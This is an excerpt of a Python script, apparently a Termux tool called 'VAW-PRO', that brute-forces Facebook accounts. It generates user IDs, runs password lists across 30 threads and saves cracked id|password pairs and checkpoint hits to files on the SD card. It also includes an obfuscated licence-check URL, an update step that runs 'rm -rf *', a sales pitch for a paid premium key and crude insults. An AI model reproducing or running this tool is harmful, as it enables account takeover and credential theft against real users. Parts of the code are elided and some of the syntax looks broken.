...
try:
        ...
        os.system('python VAW.py')
except:pass
myid=uuid.uuid4().hex[:5].upper()
try:
        key1 = open('/data/data/com.termux/files/usr/bin/.mrVAWxxx-cov', 'r').read()
except:
        kok=open('/data/data/com.termux/files/usr/bin/.mrVAWxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrVAWxxx-cov', 'r').read()
kex=(f"VAW-XD{uid}TS{key1}PX110E==")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for VAW New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n VAW-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd VAW-PRO')
                os.system('rm -rf *')
               # os.system("curl -L https://raw.githubusercontent.com/VAW110/VAW-PRO/main/VAW.py -o VAW.py && python VAW.py")
...
----------------------------------------------
 ...
 version : 0.01
----------------------------------------------
 For Haters: okat me re boka choda 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/profile.php?id=100070764496580');menu()
                        elif xd in ['7','07']:
                             #   os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/VAW_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi VAW Sir, I Need To Buy Your Paid VAW PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python VAW.py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as VAW:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [VAW-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        VAW=session.cookies.get_dict().keys()
                        if "c_user" in VAW:
                                print('\r\r\033[1;32m [VAW-OK] %s | %s'%(ids,pas))
                                open('/sdcard/VAW-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VAW:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [VAW-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VAW-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [VAW-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VAW-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[VAW-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [VAW-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VAW-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [VAW-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VAW-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
